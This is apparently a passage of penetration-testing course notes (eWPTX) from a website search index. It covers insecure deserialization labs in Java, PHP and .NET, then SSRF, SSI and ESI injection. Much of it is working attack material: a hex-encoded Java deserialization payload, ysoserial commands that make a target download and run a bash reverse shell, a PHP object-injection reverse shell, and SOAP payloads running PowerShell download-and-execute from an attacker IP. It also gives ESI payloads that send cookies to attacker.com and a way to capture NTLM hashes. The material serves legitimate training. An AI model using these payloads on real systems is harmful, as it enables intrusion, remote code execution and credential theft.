\x6e\\x67\\x2e\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x74\\x00\\x0c\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x15\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x52\\x65\\x6d\\x6f\\x74\\x65\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x93\\x74\\x00\\x0e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x74\\x00\\x08\\x43\\x4c\\x49\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x48\\x74\\x00\\x1f\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x74\\x00\\x19\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x07\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\xdf\\x71\\x00\\x7e\\x00\\x2a\\x71\\x00\\x7e\\x00\\x2b\\x74\\x00\\x05\\x5f\\x6d\\x61\\x69\\x6e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\x86\\x71\\x00\\x7e\\x00\\x2a\\x71\\x00\\x7e\\x00\\x2b\\x74\\x00\\x04\\x6d\\x61\\x69\\x6e\\x73\\x72\\x00\\x26\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x4c\\x69\\x73\\x74\\xfc\\x0f\\x25\\x31\\xb5\\xec\\x8e\\x10\\x02\\x00\\x01\\x4c\\x00\\x04\\x6c\\x69\\x73\\x74\\x71\\x00\\x7e\\x00\\x0f\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x72\\x00\\x2c\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x19\\x42\\x00\\x80\\xcb\\x5e\\xf7\\x1e\\x02\\x00\\x01\\x4c\\x00\\x01\\x63\\x74\\x00\\x16\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x3b\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x73\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x41\\x72\\x72\\x61\\x79\\x4c\\x69\\x73\\x74\\x78\\x81\\xd2\\x1d\\x99\\xc7\\x61\\x9d\\x03\\x00\\x01\\x49\\x00\\x04\\x73\\x69\\x7a\\x65\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x00\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x71\\x00\\x7e\\x00\\x39\\x78\\x71\\x00\\x7e\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x00\\x00\\x00\\x01\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x90\\xce\\x58\\x9f\\x10\\x73\\x29\\x6c\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00\\x18\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x6c\\x69\\x45\\x6e\\x74\\x72\\x79\\x50\\x6f\\x69\\x6e\\x74\\x71\\x00\\x7e\\x00\\x24\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9\\x1d\\x7b\\x47\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x74\\x00\\x1d\\x52\\x50\\x43\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x28\\x31\\x2c\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x29' print 'sending payload...' sock.send(payload) data = sock.recv(1024) print('received \"%s\"' % data)  sock.close()   Step 5: Create a reverse shell payload.   Copy and paste the command into a file and save it as shell.sh.   Syntax:  bash -i &gt;&amp; /dev/tcp/&lt;lhost&gt;/&lt;lport&gt; 0&gt;&amp;1   Command:  bash -i &gt;&amp; /dev/tcp/192.24.161.2/9999 0&gt;&amp;1   Step 6: Setup a Netcat listener that will be listening for connections on port 9999.   Command:  nc -lvp 9999   Step 7: Host the shell.sh file using a Python SimpleHTTPServer. In the same directory where the file is present, execute the below.   Command:  python -m SimpleHTTPServer 8888   Step 8: Generate a payload with a ysoserial file and make the target machine download the shell.sh file from attacker machine.   Command:  java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 \"curl http://192.24.161.2:8888/shell.sh -o /tmp/shell.sh\" &gt; /root/payload.out   Step 9: Execute the python exploit code.   Usage: python exploit.py   &lt;/path/to/payload&gt;   Command:  python exploit.py 192.24.161.3 8080 /root/payload.out   This result from the python server shows that shell.sh file is downloaded by the target machine, and the payload is working as expected.   We have to run the python exploit two more times to execute the bash script in the target machine.   Step 10: Generate a payload again for making the downloaded shell.sh file executable.   Command:  java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 \"chmod +x /tmp/shell.sh\" &gt; /root/payload.out   Step 11: Execute the python code again to send the payload for making shell.sh file executable.   Command:  python exploit.py 192.24.161.3 8080 /root/payload.out   Step 12: Generate a payload for executing the downloaded shell.sh file again.   Command:  java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 \"/bin/bash /tmp/shell.sh\" &gt; /root/payload.out   Step 13: Execute the python code again to send the payload to the target machine for executing shell.sh file.   Command:  python exploit.py 192.24.161.3 8080 /root/payload.out   Step 14: Open the terminal where the Netcat was listening. The shell should arrive on the Netcat listener.   Check the id by the following command.   Command:  id      Successfully achieved remote code execution.    Lab 3  Solution   Step 1: Open the lab link to access the Kali GUI instance.   Step 2: Check if the provided machine/domain is reachable.   Command:  ping -c3 demo.ine.local   The provided machine is reachable.   Step 3: Check open ports on the provided machine.   Command:  nmap -sS -sV demo.ine.local   Port 80 (Apache webserver) and 3306 (MySQL server) are open on the target machine.   Step 4: Open the browser to inspect the hosted website.  URL: http://demo.ine.local      An instance of XVWA is hosted on the Apache webserver.    Step 5: Open PHP Object Injection page.   Select PHP Object Injection from the available set of vulnerabilities:   Step 6: Interact with the vulnerable page.  Press the CLICK HERE button and notice the resulting URL:   You should see the following URL:   http://demo.ine.local/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:”XVWA”;i:1;s:33:”Xtreme Vulnerable Web Application”;}   There is an object in the URL parameter      If you notice closely, the values present in this parameter - XVWA and Xtreme Vulnerable Web Application are shown on the page.    But what exactly is this object contained in the r parameter?   Lets search for it:   Search string:  a:2:{i:0;s:4:\"\";i:1;s:33:\"\";}   We have intentionally omitted any references to XVWA to avoid getting results specific to it.   Notice we got back some results indicating it is serialized PHP data.   One of the comments on SO also indicates to use the PHP serialize and unserialize methods on this kind of input:   Let’s try to produce similar results using the serialize method from PHP:   Commands:  php -a echo serialize(\"Hello World!\"); echo serialize(array('a', 2, 'c', 4, 'e', 6, 'g', 8, 'i', 10));   The above commands would do the following:  php -a: Launch an interactive PHP environment - a REPL (read-eval-print-loop). Here we can run PHP code without having to set up any webserver.   The second command serialized the string Hello World!.   The result is simple enough -  s:12  # indicates what follows is a string of 12 characters.   The third command goes one step ahead and serializes an array, which is where serialization has its value - more on that shortly.   The output says  a:10 ```bash  , indicating what follows is an array of size 10. Then we have all the elements of the array. Each array elements index and value are indicated. For instance, lets consider the first two elements:  ```bash i:0;s:1:\"a\" # Element at index 0 is a string of size 1 and that string is \"a\". i:0;i:2 # Element at index 1 is an integer and it's value is 2.      Hopefully, this makes much more sense now.    What’s serialization?           Sometimes you get to situations where you have to pass objects over the network, or the state of a program is to be stored for later use. How can you do that, provided that the information is present in an object?            One possibility is to save all the object’s properties and then populate them back later. That would be good, but it would be reinventing the wheel and would not be as optimized and compact as it could have been. Serialized objects must also later be deserialized. Since this is a standard requirement, it is built-in into the programming languages like Java, PHP, and the like.          Now that we know the parameter we saw in the URL was actually a PHP serialized object, let’s figure it out using what we learned above:    Commands:  php -a echo unserialize('a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}'); var_dump(unserialize('a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}'));   We run the PHP code from the interactive mode and unserialize the PHP object. Notice that it is an associative array having two items.   Check the PHP manual for unserialize:   Notice the big red warning message. It’s a clear warning to the developers about the RCE threat if they pass user-controlled input to the unserialize function.   Step 7: Check the source code of the PHP Object Injection page from Github.  URL: https://github.com/s4n7h0/xvwa/blob/master/vulnerabilities/php_object_injection/home.php   Notice the relevant code snippet shown in the above image. If the request contains the parameter r, its value is unserialized. Also, notice the call to eval - the inject parameter is directly passed to eval, which is an excellent opportunity for RCE.   Step 8: Exploit the insecure PHP deserialization vulnerability.   Save the following code snippet as object.php   &lt;?php class PHPObjectInjection {     public $inject = \"system('id');\"; }  $obj = new PHPObjectInjection(); var_dump(serialize($obj)); ?&gt;    Notice the above code snippet sets the inject parameter to system(‘id’), which would run the id command on the webserver.   Serialize the object:   Command:  php object.php   Serialized payload:  O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:13:\"system('id');\";}      Assign the generated value in the r parameter in the URL:   Notice the results of the id command are shown on the page.   With that, we successfully exploited the insecure deserialization issue to run arbitrary commands.   Step 9: Check the list of running processes.   Now that we have code execution on the target server, let’s check the list of running processes:   Save the following code snippet as object.php   &lt;?php class PHPObjectInjection {     public $inject = \"system('ps aux');\"; }  $obj = new PHPObjectInjection(); var_dump(serialize($obj)); ?&gt;    Serialize the object:   Command:  php object.php   Serialized payload:  O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('ps aux');\";}   Assign the generated value in the r parameter in the URL:   The process listing is retrieved, as shown in the above image.   Check the page source for a better-formatted response (press CTRL+U):   Step 10: Obtain a reverse shell.   Running single commands is good, but it requires us to generate the serialized value every time.      Let’s get a reverse shell to avoid that.    Before moving on to the payload generation part, retrieve the IP address of the attacker machine:   Command:  ip addr   The IP address of the attacker machine is 192.222.13.2      [Note] The IP address is bound to change with every lab run. Kindly make sure to replace the IP address used in the payload. Otherwise, the payload wouldn’t work.    Save the following code snippet as object.php   &lt;?php class PHPObjectInjection {     public $inject = \"system('/bin/bash -c \\'bash -i &gt;&amp; /dev/tcp/192.222.13.2/54321 0&gt;&amp;1\\'');\"; }  $obj = new PHPObjectInjection(); var_dump(serialize($obj)); ?&gt;    Serialize the object:   Command:  php object.php   Serialized payload:  O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:71:\"system('/bin/bash -c \\'bash -i &gt;&amp; /dev/tcp/192.222.13.2/54321 0&gt;&amp;1\\'');\";}   Start a Netcat listener on port 54321 (since we specified this port in the reverse shell payload as well):   Command:  nc -lvp 54321   Assign the generated value in the r parameter in the URL:   It didn’t work. But why is that?   It is because the serialized payload contains characters like / and &amp; which are treated specially by the web browser and the server.      To avoid that, we will encode the serialized payload.    You can use Burp to do that or use websites like https://www.url-encode-decode.com/ to get the job done:   URL-encoded serialized payload:  O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A71%3A%22system%28%27%2Fbin%2Fbash+-c+%5C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.222.13.2%2F54321+0%3E%261%5C%27%27%29%3B%22%3B%7D      [Note] Make sure not to copy this payload as is, since the IP would be different for the attacker machine assigned to you.    Assign the URL-encoded payload in the r parameter in the URL:   Check the terminal where the Netcat listener was running:      We have gained a reverse shell!    Now we can run commands without having to generate command payloads every single time:   Commands:  id pwd ls -al   With that, we conclude this lab on Insecure PHP Deserialization also known as PHP Object Injection.      We learned about serialization and deserialization, how to generate serialized values, and how to unserialize them. We also reviewed the PHP code and uncovered the use of a code execution sink, namely the eval function.       Finally, we exploited the vulnerable code by generating malicious serialized objects to gain command execution on the target server.    References:  - XVWA = https://github.com/s4n7h0/xvwa - PHP Associative Arrays = https://www.w3schools.com/PHP/php_arrays_associative.asp - PHP Serialize = https://www.php.net/manual/en/function.serialize.php - PHP Unserialize = https://www.php.net/manual/en/function.unserialize.php   Lab 4  Solutions   Below, you can find solutions for each task. Remember though, that you can follow your own strategy, which may be different from the one explained in the following lab.   Task 1. Perform reconnaissance and find a soap-based web service   A port scan reveals two possible candidates (see below).  nmap -sV -p- demo.ine.local -T4 --open -v -Pn   The results are:  Not shown: 62690 closed tcp ports (reset), 2831 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT      STATE SERVICE            VERSION 80/tcp    open  http               Microsoft IIS httpd 8.5 135/tcp   open  msrpc              Microsoft Windows RPC 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1234/tcp  open  http               MS .NET Remoting httpd (.NET CLR 4.0.30319.42000) 3389/tcp  open  ssl/ms-wbt-server? 5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49152/tcp open  msrpc              Microsoft Windows RPC 49153/tcp open  msrpc              Microsoft Windows RPC 49154/tcp open  msrpc              Microsoft Windows RPC 49155/tcp open  msrpc              Microsoft Windows RPC 49160/tcp open  msrpc              Microsoft Windows RPC 49192/tcp open  msrpc              Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows   Examining the service on port 80 shows a frame that fails to be loaded.   The service on port 1234 reacts to a simple SOAP message.      [Note] That it is a valid service endpoint, since when requesting an incorrect path the error mentions Requested Service not found.    Task 2. Execute code on remote machine   Lets use ysoserial.net to generate a payload in SoapFormat, in an attempt to identify if the remote service is vulnerable.  Note that you might need to remove \\&lt;SOAP:Body&gt; tags from the resulting payload before testing.   Also note that you need a Windows OS on which you will run the ysoserial.net binary with the below command:  ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c \"cmd /c [command]\" -o raw   The .NET serialization protocol in this case does not verify the length of the command string, it will thus be possible to interfere with it after generating the payload. The payload is then copied to Burp with the following changes:           As said before, Soap Body tags should be removed            In order to have a valid soap message, a dummy SOAPAction header is required. This is related to SOAP and not related to this specific lab            The content type should be text/xml like in every SOAP request            If you are receiving an error stating Requested service was not found, you might also need to clear some whitespaces / newlines       Blind Code execution can be confirmed, for example, using ping.   For that, we need the IP address of the attacker machine:   Command:  ip addr   Request:  POST /VulnerableEndpoint.rem HTTP/1.1 Host: demo.ine.local:1234 SOAPAction: something Content-type: text/xml User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://demo.ine.local/ Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 1478  &lt;SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"                    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"                    xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"                    xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"                    xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\"                    SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;   &lt;a1:TextFormattingRunProperties id=\"ref-1\"                                   xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35\"&gt;     &lt;ForegroundBrush id=\"ref-3\"&gt;       &amp;lt;ResourceDictionary         xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"         xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"         xmlns:System=\"clr-namespace:System;assembly=mscorlib\"         xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\"&amp;gt;         &amp;lt;ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\" &amp;gt;           &amp;lt;ObjectDataProvider.MethodParameters&amp;gt;             &amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;             &amp;lt;System:String&amp;gt;\"/c ping 10.10.27.2\"&amp;lt;/System:String&amp;gt;           &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;         &amp;lt;/ObjectDataProvider&amp;gt;       &amp;lt;/ResourceDictionary&amp;gt;     &lt;/ForegroundBrush&gt;   &lt;/a1:TextFormattingRunProperties&gt; &lt;/SOAP-ENV:Envelope&gt;        [Note] Make sure to place the IP address of your attacker machine in the above command.    Before sending the above request, use the following command to listen for ICMP requests/replies:   Command:  tcpdump -i any icmp   Send the request to the vulnerable SOAP endpoint:   By the time the crafted request is sent, we can notice ICMP traffic reaching our sniffer from the remote target!   Task 3. Get command output using an out-of-band channel   There are many methods to achieve that goal. We will do the task using PowerShell. First, we will create the following snippet and then host it using Python’s SimpleHTTPServer module.  $c=whoami;curl http://10.10.27.2:445/$c python3 -m http.server 445      [Note] Make sure to place the IP address of your attacker machine in the above command.    And finally, the following command is injected into the serialized payload:  powershell -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')\"      [Note] Make sure to place the IP address of your attacker machine in the above command.    The request for out-of-band data exfiltration via command execution is:  POST /VulnerableEndpoint.rem HTTP/1.1 Host: demo.ine.local:1234 SOAPAction: something Content-type: text/xml User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://demo.ine.local/ Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 1478  &lt;SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"                    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"                    xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"                    xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"                    xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\"                    SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;   &lt;a1:TextFormattingRunProperties id=\"ref-1\"                                   xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35\"&gt;     &lt;ForegroundBrush id=\"ref-3\"&gt;       &amp;lt;ResourceDictionary         xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"         xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"         xmlns:System=\"clr-namespace:System;assembly=mscorlib\"         xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\"&amp;gt;         &amp;lt;ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\" &amp;gt;           &amp;lt;ObjectDataProvider.MethodParameters&amp;gt;             &amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;             &amp;lt;System:String&amp;gt;\"/c powershell -exec Bypass -C \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')\\\"\"&amp;lt;/System:String&amp;gt;           &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;         &amp;lt;/ObjectDataProvider&amp;gt;       &amp;lt;/ResourceDictionary&amp;gt;     &lt;/ForegroundBrush&gt;   &lt;/a1:TextFormattingRunProperties&gt; &lt;/SOAP-ENV:Envelope&gt;        [Note] Make sure to place the IP address of your attacker machine in the above request.    Send the above request from Burp Suite:      We can see the output of the whoami command being transmitted in the HTTP GET parameter.       This is because PowerShell fetched the remote resource and then immediately executed it using the IEX command. Note that we haven’t even touched the filesystem!    ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/zattackingserialization/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser11.jpg"
      },{
        "title": "11 - Server Side Attacks",
        "excerpt":"  Server-Side Attacks      Server-Side Request Forgery   Server-Side Include   Language Evaluation   Attacking XSLT Engines   Objectives:      Understanding how user input can be handled by back-end logic   Finding and Exploiting Server-Side bugs   Abusing Intermediate Devices  When Tomcat is combined with a Nginx reverse proxy, an insecure condition may occur; This is because Tomcat itself will treat ..;/ as if it was a parent directory traversal sequence ../ and normalize (sanitize) that sequence.      However, when relying on the reverse proxy For this task, the proxy might not do that, allowing For escaping up one directory because they will pass that path to Tomcat unchanged, and Tomcat will not perform additional validation since it relies on the reverse proxy to do it.   Example:  http://tomcatapplication.com/..;/manager/html   # might reveal the Tomcat Manager   Another opportunity to access the hidden Tomcat manager is AJP Proxy.      Usually running on port 8009 and is accompanied by Tomcat-based websites.   ajp13 is not a web app, its a binary protocol   However, ajp proxy might be a gateway to internal resources (administrative panels or unpublished websites)   To connect to a remote ajp port, u need to have Apache installed on your system  apt-get install apache2   Then u need to install the ajp-related module:  apt install libapache2-mod-jk   And enable it:  a2enmod proxy_ajp   Create a file path under the path: /etc/apache2/sites-enabled/ajp.conf      Then restart apache. it should be able to visit the remote website at http://127.0.0.1.      Since the real web app server is hidden deep inside its infrastructure, the ability to know its real IP address can be a vuln itself.       It could be even better if one is able to issue a request on behalf of that server or in the most complex case, retrieve the results of such requests    SSRF Attack  Server-Side request forgery is an attack in which the user is able to make the application server (or a proxy or another part of its infra) issue a request For external resources   The exploitation of SSRF can lead to:  - Sensitive Information Disclosure - Stealing authentication information (Windows NTLM hashes) - File read/inclusion - Remote Code Execution   The most obvious places to look For:  - in Load profile picture from URL functionalities  - or similar features   The safest way to fetch a remote file by the target website would be to do it using client-side javascript. In such a case, the request is performed by the users computer and no application infrastructure takes part in requesting the remote resources.   When SSRF is a Feature  SSRF attack can be conducted not only against image import utilities but any mechanisms that rely on fetching remote resources. In web apps typically it can be:  - API specification imports (WSDL imports) - Other file imports - Connection to remote server (FTP) - **ping** or **alivecheck** utilities - Any parts of an http request that includes URLs   Blind SSRF Exploitation  Example: document generators   If one is able to inject content into an online PDF generator, inserting something like the code below might likely lead to receiving a GET request from the parser server. Its because the server-side content parser will try to evaluate the content before rendering the PDF  &lt;img src=http://attacker.com:80/ssrf&gt;           It will then parse the IMG tag and try to fetch the remote picture without knowing that it does not exist            SSRF payloads can be inserted in HTTP request headers. You can, For example, place your domain in any HTTP header and look For HTTP or DNS resolution          in BURP intruder u can feed it with a list of all HTTP headers and assign your domain to each of them. its possible that some of the intermediate proxies might try to resolve these domains.    URL Structure  https://chromium.googlesource.com/chromium/src/+/master/docs/security/url_display_guidelines/url_display_guidelines.md  https://user:pass@sub.example.com:8080/path?query#fragment   SSRF Example  https://github.com/ethicalhack3r/DVWA   We will use the File Inclusion module, which is similar to a web app fetch file functionalities. DVWA has to run in Low security mode.      We want to proxy our requets via BURP   Install socat  apt install socat   Then the DVWA is exposed via port forwarding using socat external port 800 will be connected to internal 80. This will expose ur vuln app to the outside world   Forward:  sudo socat tcp-listen:800,fork tcp:127.0.0.1:80  # Now its exposed    We can try to start a listener in netcat and fetch its address via a GET request  GET /DVWA/vulnerabilities/f?page=http://test:pwd@127.0.0.1:21/a HTTP/1.1   Forcing Authentication  nv -lvnp 21  # the back-end used the username:password combination as a Basic Authentication header!  # This means, when issuing an arbitrary request, we can also do it to like basic authentication protected resources   Changing Protocol  DVWA also accepts an https URL scheme and tries to establish an encrypted connection:  GET /DVWA/vulnerabilities/f?page=https://test:pwd@127.0.0.1:21/ssl HTTP/1.1   Since we are using a plaintext connection netcat, we just see the attempt to establish SSL to our listener   The ‘file://’ scheme is also accepted, resulting in file inclusion.  GET /DVWA/vulnerabilities/f?file=http:///etc/passwd HTTP/1.1   You can always test more protocols handlers   https://www.php.net/manual/en/wrappers.php  - file:// # accessing local filesystem - http:// # accessing HTTP(s) URLs - ftp://  # accessing FTP(s) URLs - php://  # accessing various I/O streams - zlib:// # compression streams - data:// # data (RFC 2397) - glob:// # find pathnames matching patterns - phar:// # php archive - ssh2:// # secure shell 2 - rar://  # rar - ogg://  # audio streams - expect:// # process interaction streams   Attacking SSRF on Windows  You can try to access a UNC path in the following format:  file:///\\\\attackerdomain\\sharename      https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc   If the server tries to authenticate to a fake share, you might be able to steal its NTLM password hash. The hash can be subject to further offline cracking.   SMB authentication attempts can be captured (e.g. using the metasploit module)  auxiliary/server/capture/smb   Other SSRF Scenarios  Sometimes, it will be possible to fetch a remote HTML file.   So, SSRF will lead to Reflected XSS:  cat xss.html # &lt;script&gt;alert(document.domain)&lt;/script&gt;      Upon visiting the URL, the remote HTML file is included by the server    Time-based SSRF  Used especially in Blind exploitation scenarios      Based on differences in response time, one may be able to perform an internal port scan or internal network/domain discovery   Extending SSRF  What can we get:  - RCE (best scenario) - File inclusion - Reading sensitive data - Interact with internal services # Even executing only GET requests,  # its enough to execute critical actions on internal services and execute arbritrary code.   Server-Side Include  Its a language-neutral web server technology that supports creating dynamic content before rendering the page.      when the web app makes use of .shtml, .shtm or .stm pages   The best options is to inject examplary SSI tags into the web app and observer the place where they are rendered.      U can add examplary of SSI payloads in the BURP intruder list    SSI Expressions  Example:  &lt;!--#directive param=\"value\"-- &gt;   You can try to execute commands For printing server-side variables:  &lt;!--#echo var=\"DOCUMENT NAME\"-- &gt; &lt;!--#echo var=\"DATE LOCAL\"-- &gt; &lt;!--#include virtual=\"/index.html\"-- &gt; &lt;!--#exec cmd=\"dir\"-- &gt; &lt;!--#exec cmd=\"ls\"-- &gt;   SSI Practice  You can practice here:  https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project   Edge Side Includes (ESI)  Proxies and other similar intermediate infrastructure utilize them      modern web app often consist of several intermediate server before users requests reach the end application server. We should try to interact with such intermediate infrastructure by injecting some ESI tags to our requests        ESI has a form of XML Tags, which are dynamically added to cached static content in order to enrich them with some dynamic features.       The ESI Tags are injected by cache mechanisms For other cache mechanisms; However, if a user is able to add ESI tags to the HTTP request, the proxies might parse it without knowing its origin.      ESI Expressions  Example:  &lt;esi:include src=\"/weather/name?id=$(QUERY_STRING{city_id})\"/&gt;   ESI Detection  In most cases, using a Blind Attack approach   If u see the header:  Surrogate-Control: content=\"ESI/1.0\" # in this case, u can suspect that ESI is in use.  # However, in most cases, there will be no sign of using ESI   To detect with Blind approach, the user can try to inject tags that cause the proxies to resolve arbitrary addresses resulting in SSRF:  &lt;esi:include src=http://attacker.com/&gt;   ESI Exploitation  Might be possible to include a HTML file resulting in XSS:  &lt;esi:include src=http://attacker.com/xss.html&gt;   The xss.html can contain similar code:  &lt;script&gt;alert(1)&lt;/script&gt;   Exfiltrate cookies directly by referring to a special variable:  &lt;esi:include src=http://attacker.com/$(HTTP_COOKIE)&gt; # which can bypass the httpOnly flag in case of its presence   There is a possibility For RCE when the app has support For XSLT      XLST is a dynamic language used to transform XML files according to a specific pattern   The Payload For the ESI Injection to the XSLT execution:  &lt;esi:include src=\"http://attacker.com/file.xml\" dca=\"xslt\" stylesheet=\"http://attacker.com/transformation.xsl\" /&gt;   Moreover:  - https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection - 